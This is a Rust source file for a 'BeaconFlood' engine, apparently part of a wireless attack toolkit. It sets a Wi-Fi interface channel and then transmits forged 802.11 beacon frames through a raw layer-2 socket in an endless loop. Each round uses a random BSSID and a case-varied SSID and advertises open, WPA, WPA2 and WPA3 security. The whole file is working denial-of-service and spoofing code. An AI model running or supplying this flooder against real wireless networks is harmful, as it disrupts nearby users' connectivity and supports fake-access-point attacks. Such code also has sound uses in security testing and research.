use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Instant;
use crate::engines::BcFloodArgs;
use crate::iface::{Iface, IfaceManager};
use crate::builders::Beacon;
use crate::sockets::Layer2Socket;
use crate::generators::RandomValues;
use crate::utils::{CtrlCHandler, abort, Bssid};



pub struct BeaconFlood {
    iface   : Iface,
    channel : u8,
    ssid    : String,
    bc_sent : usize,
    builder : Beacon,
    socket  : Layer2Socket,
}


impl BeaconFlood {

    pub fn new(args: BcFloodArgs) -> Self {
        Self { 
            bc_sent : 0,
            builder : Beacon::new(),
            socket  : Layer2Socket::new(&args.iface),
            iface   : args.iface,
            channel : args.channel as u8,
            ssid    : args.ssid,
        }
    }



    pub fn execute(&mut self) {
        self.set_channel();
        self.send_endlessly();
    }



    fn set_channel(&self) {
        if !IfaceManager::set_channel(self.iface.name(), self.channel as i32) {
            abort(
                format!(
                    "Uneable to set channel {} on interface {}", 
                    self.iface.name(),
                    self.channel
                )
            )
        }
    }



    fn send_endlessly(&mut self) {
        let mut rand = RandomValues::new(None, None); 
        let running  = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());

        let init = Instant::now();
        println!("[+] Sending beacons. Press CTRL + C to stop");

        while running.load(Ordering::SeqCst) {
            let bssid = rand.random_bssid();
            let ssid  = rand.random_case_inversion(&self.ssid);
            let seq   = rand.random_seq();
            
            self.send_quartet(bssid, &ssid, seq);
        }

        let time = init.elapsed().as_secs_f64();
        
        println!("\n[-] Flood interrupted"); 
        println!("[%] {} beacons sent in {:.2} seconds", &self.bc_sent, time);
    }



    fn send_quartet(
        &mut self,
        bssid : Bssid,
        ssid  : &str,
        seq   : u16
    ) {
        self.send_beacon(bssid, ssid, seq,     "open");
        self.send_beacon(bssid, ssid, seq + 1, "wpa");
        self.send_beacon(bssid, ssid, seq + 2, "wpa2");
        self.send_beacon(bssid, ssid, seq + 3, "wpa3");
    }



    #[inline]
    fn send_beacon(
        &mut self, 
        bssid : Bssid, 
        ssid  : &str,
        seq   : u16,
        sec   : &str
    ) {
        let beacon = self.builder.beacon(bssid, ssid, seq, self.channel, sec);

        self.socket.send(beacon);
        self.bc_sent += 1;
    }

}




impl crate::EngineTrait for BeaconFlood {
    type Args = BcFloodArgs;
    
    fn new(args: Self::Args) -> Self {
        BeaconFlood::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}